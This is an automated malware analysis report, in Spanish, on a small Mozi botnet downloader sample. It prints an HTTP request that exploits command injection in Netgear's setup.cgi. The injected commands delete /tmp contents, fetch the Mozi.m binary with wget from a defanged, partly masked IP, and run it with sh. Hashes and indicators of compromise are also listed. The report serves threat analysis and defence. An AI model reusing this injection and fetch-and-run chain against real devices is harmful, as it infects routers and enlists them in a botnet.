# 🧬 Payload Analysis

`26d611676254dccf1faf1011ed5a4fc838817cdb4ed8ecb8a96a33405285a1ca`

## 📌 Resumen

Texto ASCII de 176 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://72.255.18.XXX:49349/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://72.255.18.XXX:49349/Mozi.m -O /tmp/netgea` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/26d611676254dccf1faf1011ed5a4fc838817cdb4ed8ecb8a96a33405285a1ca.md](../../../../../malware-like/oraculo/downloader/26d611676254dccf1faf1011ed5a4fc838817cdb4ed8ecb8a96a33405285a1ca.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `26d611676254dccf1faf1011ed5a4fc838817cdb4ed8ecb8a96a33405285a1ca`
- **SHA1:** `7a8d273cda6c8bc5ddfaa1132127d400f29913af`
- **MD5:** `2edd6de4037365b385205c12d618bb20`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 176 B |
| Entropía | 5.22 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://72.255.18.XXX:49349/Mozi.m+-O+/tmp/netgea
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://72.255.18.XXX:49349/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 72.255.18.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://72.255.18.XXX:49349/Mozi.m+-O+/tmp/netgea | strings |
| hash | 26d611676254dccf1faf1011ed5a4fc838817cdb4ed8ecb8a96a33405285a1ca | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
